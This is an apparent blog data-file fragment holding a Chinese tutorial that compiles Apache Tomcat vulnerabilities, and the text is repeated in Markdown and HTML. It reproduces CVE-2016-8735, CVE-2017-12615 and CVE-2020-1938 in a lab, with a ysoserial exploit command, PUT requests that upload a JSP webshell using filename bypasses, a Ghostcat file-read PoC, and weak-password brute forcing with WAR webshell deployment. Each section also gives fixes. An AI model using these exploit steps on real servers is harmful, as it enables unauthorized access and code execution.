zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 5\n\nshell\n```\n\n下图所示修改shell.jsp/即可上传成功\n\n![image-20200813131744168](/images/tomcat/image-20200813131744168.png)\n\n文件访问\n\n![image-20200813133423171](/images/tomcat/image-20200813133423171.png)\n\nshell管理\n\n![image-20200813134428832](/images/tomcat/image-20200813134428832.png)\n\n##### 漏洞修复\n\n1、删除web.xml文件中readonly属性的值为true或直接删除\n\n2、更新至官方最新\n\n#### CVE-2020-1938\n\n##### 漏洞描述\n\nCVE-2020-1938是由于Apache Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。\n\n由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。\n\n##### 影响范围\n\nApache Tomcat 6\n\nApache Tomcat 7 < 7.0.100\n\nApache Tomcat 8 < 8.5.51\n\nApache Tomcat 9 < 9.0.31\n\n##### 漏洞原理\n\n由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。\n\n##### 漏洞条件\n\n无条件（漏洞环境[参考](https://github.com/0nise/CVE-2020-1938)zip解压并执行）\n\n##### 漏洞检测\n\n1、URL访问\n\n```\nhttp://192.168.3.167:8080/\n```\n\n![image-20200813153350723](/images/tomcat/image-20200813153350723.png)\n\n2、端口号检测\n\n![image-20200813153640165](/images/tomcat/image-20200813153640165.png)\n\n由上可以知道目标主机开放8009端口号。\n\n3、PoC读取文件\n\n```\npython CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.3.167 -p 8009 -f WEB-INF/web.xml\n```\n\n![image-20200813153702055](/images/tomcat/image-20200813153702055.png)\n\n##### 漏洞修复\n\n1、下载最新\n\n```\nhttps://tomcat.apache.org/download-70.cgi\nhttps://tomcat.apache.org/download-80.cgi\nhttps://tomcat.apache.org/download-90.cgi\nhttps://github.com/apache/tomcat/releases\n```\n\n2、临时禁用AJP协议端口，\n\n在conf/server.xml\n\n`注释此行<Connector port=\"8009\" protocol=\"AJP/1.3\"redirectPort=\"8443\" />`\n\n![image-20200813154014736](/images/tomcat/image-20200813154014736.png)\n\n#### Weak password\n\n##### 漏洞描述\n\n弱口令属于常见漏洞，也是在漏洞挖掘时一个很好的突破口；而tomcat如果存在弱口令，那将会影响系统被攻击者获取系统权限。\n\n##### 影响范围\n\n所有版本\n\n##### 漏洞原理\n\n口令设置较弱，可直接爆破。\n\n```xml\nconf/tomcat-users.xml(添加一行即可)\n<user username=\"tomcat\" password=\"tomcat\" roles=\"manager-status,manager-gui,manager-script,manager-jmx\"/>\n```\n\n##### 漏洞条件\n\n无条件\n\n##### 漏洞检测\n\n1、URL访问\n\n```\nhttp://192.168.3.167:8080/\n```\n\n![image-20200813163502206](/images/tomcat/image-20200813163502206.png)\n\n2、点击“Server Status”\n\n![image-20200813163542988](/images/tomcat/image-20200813163542988.png)\n\n3、尝试爆破\n\n[脚本](https://github.com/magicming200/tomcat-weak-password-scanner)\n\n![image-20200813163718308](/images/tomcat/image-20200813163718308.png)\n\n4、生成war包\n\n```shell\n➜  server jar -cvf  shell.war shell.jsp\n```\n\n![image-20200813163839974](/images/tomcat/image-20200813163839974.png)\n\n5、部署war包\n\n![image-20200813164753751](/images/tomcat/image-20200813164753751.png)\n\n6、访问\n\n```\nhttp://192.168.3.167:8080/shell/shell.jsp\n```\n\n![image-20200813164812341](/images/tomcat/image-20200813164812341.png)\n\n![image-20200813164838466](/images/tomcat/image-20200813164838466.png)\n\n##### 漏洞修复\n\n1、设置强壮密码\n\n2、平时不用，不允许登录\n\n### Tools\n\n[Weak_password_brute](https://github.com/si1ent-le/vuln-all/tree/master/Tomcat_vuln/weakpassword/tomcat_weakpassword_brute)\n\n[CVE-2020-1938](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2020-1938/CNVD-2020-10487-Tomcat-Ajp-lfi.py)\n\n### 参考\n\n```\nhttps://github.com/vulhub/vulhub/tree/master/tomcat\nhttps://xz.aliyun.com/t/5610\nhttps://github.com/0nise/CVE-2020-1938\n```\n\n","source":"_posts/Tomcat漏洞汇总.md","raw":"---\ntitle: Tomcat漏洞汇总\ndate: 2020-08-13 17:38:54\ntags:\n - Tomcat\n---\n\n### 介绍\n\nTomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。\n\n### 环境搭建\n\n```\nJava环境安装\nhttps://www.java.com/en/download/manual.jsp\nTomcat\nhttps://tomcat.apache.org/download-70.cgi\n以下部分漏洞环境可参考github每个漏洞介绍及实战都已提供。\n```\n\n1、下载并解压\n\n<img src=\"/images/tomcat/image-20200811143320510.png\" alt=\"image-20200811143320510\" style=\"zoom:50%;\" />\n\n2、双击执行启动服务\n\n```\nhttp://192.168.3.156:8080/\n```\n\n![image-20200811143448762](/images/tomcat/image-20200811143448762.png)\n\n#### Tomcat结构介绍\n\n下载解压后存在目录、文件信息：\n\n```shell\nbin-----存放Tomcat的脚本文件，例如启动、关闭\nconf----Tomcat的配置文件，例如server.xml和web.xml\nlib-----存放Tomcat运行需要的库文件（JAR包）\nlogs----存放Tomcat执行时的LOG文件\ntemp----存放Tomcat运行时所产生的临时文件\nwebapps-Web发布目录，默认情况下把Web应用文件放于此目录\nwork----存放jsp编译后产生的class文件\n```\n\n### 漏洞分类实战\n\n#### CVE-2016-8735\n\n##### 漏洞描述\n\nOracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。\n\n##### 影响范围\n\nApache Tomcat 9.0.0.M1 to 9.0.0.M11 \n\nApache Tomcat 8.5.0 to 8.5.6 \n\nApache Tomcat 8.0.0.RC1 to 8.0.38 \n\nApache Tomcat 7.0.0 to 7.0.72 \n\nApache Tomcat 6.0.0 to 6.0.47\n\n##### 漏洞原理\n\n该漏洞的诱因存在于Oracle已经修复的JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。因为Tomcat也使用了JmxRemoteLifecycleListener监听功能，但并没有及时升级，导致该远程代码执行漏洞。\n\n##### 漏洞条件\n\n1、要外部开启JmxRemoteLifecycleListener监听端口，实现远程利用。 \n\n```xml\nconf/server.xml\n<Listener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiRegistryPortPlatform=\"10001\" rmiServerPortPlatform=\"10002\" />\n```\n\n![image-20200812101526860](/images/tomcat/image-20200812101526860.png)\n\n2、下载对应jar放到lib目录下：\n\n- catalina-jmx-remote.jar要与对应tomcat版本一致[不同版本下载](https://archive.apache.org/dist/tomcat/)一般存在extras文件下，如下图所示\n- [groovy2.3.9](https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9)下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）\n\n![image-20200812102130773](/images/tomcat/image-20200812102130773.png)\n\n![image-20200811163431177](/images/tomcat/image-20200811163431177.png)\n\n3、接着修改bin/catalina.bat，在Execute The Requested Command处上面添加\n\n```java\nset CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false\n```\n\n- -Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯\n- -Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证\n\n![image-20200812101910590](/images/tomcat/image-20200812101910590.png)\n\n4、服务启动\n\n下图所示：服务已启动10001端口已启动\n\n![image-20200812103050881](/images/tomcat/image-20200812103050881.png)\n\n##### 漏洞检测\n\n1、执行以下PoC\n\n```java\njava -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.165 10001 Groovy1 calc.exe\n```\n\nJava 1.8出现报错\n\n![image-20200812104703039](/images/tomcat/image-20200812104703039.png)\n\n1.7的jdk成功弹出计算器\n\n![PoC](/images/tomcat/PoC.gif)\n\n##### 漏洞修复\n\n紧急措施：关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。同时，增加严格的认证方式。\n\n升级jdk（目前测试1.8是无法利用）\n\n推荐方案：官方已经发布了版本更新，建议您升级到最新版本。\n\n- Apache Tomcat 9.0.0.M13或更新版本(Apache Tomcat 9.0.0.M12也修复了此漏洞，但并未发布)\n\n- Apache Tomcat 8.5.8或更新版本(Apache Tomcat 8.5.7也修复了此漏洞，但并未发布)\n\n- Apache Tomcat 8.0.39或更新版本\n\n- Apache Tomcat 7.0.73或更新版本\n\n- Apache Tomcat 6.0.48或更新版本\n\n  \n\n#### CVE-2017-12615\n\n##### 漏洞描述\n\n远程代码执行漏洞(CVE-2017-12615)。当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。\n\n##### 影响范围\n\nApache Tomcat 7.0.0 – 7.0.79\n\n##### 漏洞原理\n\n启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）,可任意上传恶意文件至服务器端\n\n默认`readonly`为`true`，也就是无法进行PUT、DELETE行为\n\n````\nconf/web.xml\t\t//文件内容\n````\n\n![image-20200813095843352](/images/tomcat/image-20200813095843352.png)\n\n这个CVE漏洞涉及到 DefaultServlet，DefaultServlet作用是处理静态文件，同时DefaultServlet可以处理PUT或DELETE请求，默认配置如图2：\n\n![image-20200813100218371](/images/tomcat/image-20200813100218371.png)\n\n可以看出即使设置readonly为false,默认tomcat也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。\n\n绕过方式：\n\nWindows：\n1、利用/shell.jsp::$DATA的方式绕过\n2、/shell.jsp%20，空格绕过\n3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/\nLinux：\n1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/\n\n##### 漏洞条件\n\n`readonly`设置为`false`时会导致攻击者上传任意恶意文件。\n\n##### 漏洞检测\n\n漏洞环境使用[P牛docker](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615)镜像验证。\n\nTomcat version: 8.5.19\n\n![image-20200813140738965](/images/tomcat/image-20200813140738965.png)\n\n将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。修改部分如下。\n\n1、readonly默认值为true，手动将其改为false，在`conf/web.xml`中手动添加红色方框类内容。\n\n添加如下：\n\n```xml\n\t\t\t\t<init-param> \n            <param-name>readonly</param-name> \n            <param-value>false</param-value> \n        </init-param>\n```\n\n![image-20200813100605923](/images/tomcat/image-20200813100605923.png)\n\n2、修改请求头并传递post数据\n\n```\nPUT /shell.jsp HTTP/1.1\nHost: 192.168.3.49:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 5\n\nshell\n```\n\n![image-20200813131648712](/images/tomcat/image-20200813131648712.png)\n\n由上图看到提示404，说明JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。会被过滤掉。\n\n此时可以利用上面介绍的绕过方式\n\n利用文件解析漏洞采用PUT方式上传jsp webshell文件。其中文件名设为/shell.jsp/。（如果文件名后缀是空格那么将会被tomcat给过滤掉。）\n\n```\nPUT /shell.jsp/ HTTP/1.1\nHost: 192.168.3.49:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 5\n\nshell\n```\n\n下图所示修改shell.jsp/即可上传成功\n\n![image-20200813131744168](/images/tomcat/image-20200813131744168.png)\n\n文件访问\n\n![image-20200813133423171](/images/tomcat/image-20200813133423171.png)\n\nshell管理\n\n![image-20200813134428832](/images/tomcat/image-20200813134428832.png)\n\n##### 漏洞修复\n\n1、删除web.xml文件中readonly属性的值为true或直接删除\n\n2、更新至官方最新\n\n#### CVE-2020-1938\n\n##### 漏洞描述\n\nCVE-2020-1938是由于Apache Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。\n\n由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。\n\n##### 影响范围\n\nApache Tomcat 6\n\nApache Tomcat 7 < 7.0.100\n\nApache Tomcat 8 < 8.5.51\n\nApache Tomcat 9 < 9.0.31\n\n##### 漏洞原理\n\n由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。\n\n##### 漏洞条件\n\n无条件（漏洞环境[参考](https://github.com/0nise/CVE-2020-1938)zip解压并执行）\n\n##### 漏洞检测\n\n1、URL访问\n\n```\nhttp://192.168.3.167:8080/\n```\n\n![image-20200813153350723](/images/tomcat/image-20200813153350723.png)\n\n2、端口号检测\n\n![image-20200813153640165](/images/tomcat/image-20200813153640165.png)\n\n由上可以知道目标主机开放8009端口号。\n\n3、PoC读取文件\n\n```\npython CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.3.167 -p 8009 -f WEB-INF/web.xml\n```\n\n![image-20200813153702055](/images/tomcat/image-20200813153702055.png)\n\n##### 漏洞修复\n\n1、下载最新\n\n```\nhttps://tomcat.apache.org/download-70.cgi\nhttps://tomcat.apache.org/download-80.cgi\nhttps://tomcat.apache.org/download-90.cgi\nhttps://github.com/apache/tomcat/releases\n```\n\n2、临时禁用AJP协议端口，\n\n在conf/server.xml\n\n`注释此行<Connector port=\"8009\" protocol=\"AJP/1.3\"redirectPort=\"8443\" />`\n\n![image-20200813154014736](/images/tomcat/image-20200813154014736.png)\n\n#### Weak password\n\n##### 漏洞描述\n\n弱口令属于常见漏洞，也是在漏洞挖掘时一个很好的突破口；而tomcat如果存在弱口令，那将会影响系统被攻击者获取系统权限。\n\n##### 影响范围\n\n所有版本\n\n##### 漏洞原理\n\n口令设置较弱，可直接爆破。\n\n```xml\nconf/tomcat-users.xml(添加一行即可)\n<user username=\"tomcat\" password=\"tomcat\" roles=\"manager-status,manager-gui,manager-script,manager-jmx\"/>\n```\n\n##### 漏洞条件\n\n无条件\n\n##### 漏洞检测\n\n1、URL访问\n\n```\nhttp://192.168.3.167:8080/\n```\n\n![image-20200813163502206](/images/tomcat/image-20200813163502206.png)\n\n2、点击“Server Status”\n\n![image-20200813163542988](/images/tomcat/image-20200813163542988.png)\n\n3、尝试爆破\n\n[脚本](https://github.com/magicming200/tomcat-weak-password-scanner)\n\n![image-20200813163718308](/images/tomcat/image-20200813163718308.png)\n\n4、生成war包\n\n```shell\n➜  server jar -cvf  shell.war shell.jsp\n```\n\n![image-20200813163839974](/images/tomcat/image-20200813163839974.png)\n\n5、部署war包\n\n![image-20200813164753751](/images/tomcat/image-20200813164753751.png)\n\n6、访问\n\n```\nhttp://192.168.3.167:8080/shell/shell.jsp\n```\n\n![image-20200813164812341](/images/tomcat/image-20200813164812341.png)\n\n![image-20200813164838466](/images/tomcat/image-20200813164838466.png)\n\n##### 漏洞修复\n\n1、设置强壮密码\n\n2、平时不用，不允许登录\n\n### Tools\n\n[Weak_password_brute](https://github.com/si1ent-le/vuln-all/tree/master/Tomcat_vuln/weakpassword/tomcat_weakpassword_brute)\n\n[CVE-2020-1938](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2020-1938/CNVD-2020-10487-Tomcat-Ajp-lfi.py)\n\n### 参考\n\n```\nhttps://github.com/vulhub/vulhub/tree/master/tomcat\nhttps://xz.aliyun.com/t/5610\nhttps://github.com/0nise/CVE-2020-1938\n```\n\n","slug":"Tomcat漏洞汇总","published":1,"updated":"2020-10-23T03:39:06.669Z","_id":"ckglobhdu000kb1hq8gebe946","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Java环境安装</span><br><span class=\"line\">https:&#x2F;&#x2F;www.java.com&#x2F;en&#x2F;download&#x2F;manual.jsp</span><br><span class=\"line\">Tomcat</span><br><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-70.cgi</span><br><span class=\"line\">以下部分漏洞环境可参考github每个漏洞介绍及实战都已提供。</span><br></pre></td></tr></table></figure>\n\n<p>1、下载并解压</p>\n<img src=\"/images/tomcat/image-20200811143320510.png\" alt=\"image-20200811143320510\" style=\"zoom:50%;\" />\n\n<p>2、双击执行启动服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.156:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200811143448762.png\" alt=\"image-20200811143448762\"></p>\n<h4 id=\"Tomcat结构介绍\"><a href=\"#Tomcat结构介绍\" class=\"headerlink\" title=\"Tomcat结构介绍\"></a>Tomcat结构介绍</h4><p>下载解压后存在目录、文件信息：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin-----存放Tomcat的脚本文件，例如启动、关闭</span><br><span class=\"line\">conf----Tomcat的配置文件，例如server.xml和web.xml</span><br><span class=\"line\">lib-----存放Tomcat运行需要的库文件（JAR包）</span><br><span class=\"line\">logs----存放Tomcat执行时的LOG文件</span><br><span class=\"line\">temp----存放Tomcat运行时所产生的临时文件</span><br><span class=\"line\">webapps-Web发布目录，默认情况下把Web应用文件放于此目录</span><br><span class=\"line\">work----存放jsp编译后产生的class文件</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞分类实战\"><a href=\"#漏洞分类实战\" class=\"headerlink\" title=\"漏洞分类实战\"></a>漏洞分类实战</h3><h4 id=\"CVE-2016-8735\"><a href=\"#CVE-2016-8735\" class=\"headerlink\" title=\"CVE-2016-8735\"></a>CVE-2016-8735</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Oracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。</p>\n<h5 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Tomcat 9.0.0.M1 to 9.0.0.M11 </p>\n<p>Apache Tomcat 8.5.0 to 8.5.6 </p>\n<p>Apache Tomcat 8.0.0.RC1 to 8.0.38 </p>\n<p>Apache Tomcat 7.0.0 to 7.0.72 </p>\n<p>Apache Tomcat 6.0.0 to 6.0.47</p>\n<h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>该漏洞的诱因存在于Oracle已经修复的JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。因为Tomcat也使用了JmxRemoteLifecycleListener监听功能，但并没有及时升级，导致该远程代码执行漏洞。</p>\n<h5 id=\"漏洞条件\"><a href=\"#漏洞条件\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>1、要外部开启JmxRemoteLifecycleListener监听端口，实现远程利用。 </p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf/server.xml</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Listener</span> <span class=\"attr\">className</span>=<span class=\"string\">&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot;</span> <span class=\"attr\">rmiRegistryPortPlatform</span>=<span class=\"string\">&quot;10001&quot;</span> <span class=\"attr\">rmiServerPortPlatform</span>=<span class=\"string\">&quot;10002&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200812101526860.png\" alt=\"image-20200812101526860\"></p>\n<p>2、下载对应jar放到lib目录下：</p>\n<ul>\n<li>catalina-jmx-remote.jar要与对应tomcat版本一致<a href=\"https://archive.apache.org/dist/tomcat/\">不同版本下载</a>一般存在extras文件下，如下图所示</li>\n<li><a href=\"https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9\">groovy2.3.9</a>下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）</li>\n</ul>\n<p><img src=\"/images/tomcat/image-20200812102130773.png\" alt=\"image-20200812102130773\"></p>\n<p><img src=\"/images/tomcat/image-20200811163431177.png\" alt=\"image-20200811163431177\"></p>\n<p>3、接着修改bin/catalina.bat，在Execute The Requested Command处上面添加</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=<span class=\"keyword\">false</span> -Dcom.sun.management.jmxremote.authenticate=<span class=\"keyword\">false</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>-Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯</li>\n<li>-Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证</li>\n</ul>\n<p><img src=\"/images/tomcat/image-20200812101910590.png\" alt=\"image-20200812101910590\"></p>\n<p>4、服务启动</p>\n<p>下图所示：服务已启动10001端口已启动</p>\n<p><img src=\"/images/tomcat/image-20200812103050881.png\" alt=\"image-20200812103050881\"></p>\n<h5 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、执行以下PoC</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <span class=\"number\">192.168</span>.<span class=\"number\">3.165</span> <span class=\"number\">10001</span> Groovy1 calc.exe</span><br></pre></td></tr></table></figure>\n\n<p>Java 1.8出现报错</p>\n<p><img src=\"/images/tomcat/image-20200812104703039.png\" alt=\"image-20200812104703039\"></p>\n<p>1.7的jdk成功弹出计算器</p>\n<p><img src=\"/images/tomcat/PoC.gif\" alt=\"PoC\"></p>\n<h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>紧急措施：关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。同时，增加严格的认证方式。</p>\n<p>升级jdk（目前测试1.8是无法利用）</p>\n<p>推荐方案：官方已经发布了版本更新，建议您升级到最新版本。</p>\n<ul>\n<li><p>Apache Tomcat 9.0.0.M13或更新版本(Apache Tomcat 9.0.0.M12也修复了此漏洞，但并未发布)</p>\n</li>\n<li><p>Apache Tomcat 8.5.8或更新版本(Apache Tomcat 8.5.7也修复了此漏洞，但并未发布)</p>\n</li>\n<li><p>Apache Tomcat 8.0.39或更新版本</p>\n</li>\n<li><p>Apache Tomcat 7.0.73或更新版本</p>\n</li>\n<li><p>Apache Tomcat 6.0.48或更新版本</p>\n</li>\n</ul>\n<h4 id=\"CVE-2017-12615\"><a href=\"#CVE-2017-12615\" class=\"headerlink\" title=\"CVE-2017-12615\"></a>CVE-2017-12615</h4><h5 id=\"漏洞描述-1\"><a href=\"#漏洞描述-1\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>远程代码执行漏洞(CVE-2017-12615)。当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。</p>\n<h5 id=\"影响范围-1\"><a href=\"#影响范围-1\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Tomcat 7.0.0 – 7.0.79</p>\n<h5 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）,可任意上传恶意文件至服务器端</p>\n<p>默认<code>readonly</code>为<code>true</code>，也就是无法进行PUT、DELETE行为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf&#x2F;web.xml\t\t&#x2F;&#x2F;文件内容</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813095843352.png\" alt=\"image-20200813095843352\"></p>\n<p>这个CVE漏洞涉及到 DefaultServlet，DefaultServlet作用是处理静态文件，同时DefaultServlet可以处理PUT或DELETE请求，默认配置如图2：</p>\n<p><img src=\"/images/tomcat/image-20200813100218371.png\" alt=\"image-20200813100218371\"></p>\n<p>可以看出即使设置readonly为false,默认tomcat也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。</p>\n<p>绕过方式：</p>\n<p>Windows：<br>1、利用/shell.jsp::$DATA的方式绕过<br>2、/shell.jsp%20，空格绕过<br>3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/<br>Linux：<br>1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/</p>\n<h5 id=\"漏洞条件-1\"><a href=\"#漏洞条件-1\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p><code>readonly</code>设置为<code>false</code>时会导致攻击者上传任意恶意文件。</p>\n<h5 id=\"漏洞检测-1\"><a href=\"#漏洞检测-1\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>漏洞环境使用<a href=\"https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615\">P牛docker</a>镜像验证。</p>\n<p>Tomcat version: 8.5.19</p>\n<p><img src=\"/images/tomcat/image-20200813140738965.png\" alt=\"image-20200813140738965\"></p>\n<p>将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。修改部分如下。</p>\n<p>1、readonly默认值为true，手动将其改为false，在<code>conf/web.xml</code>中手动添加红色方框类内容。</p>\n<p>添加如下：</p>\n<figure class=\"highlight xml\"><table><tr><td 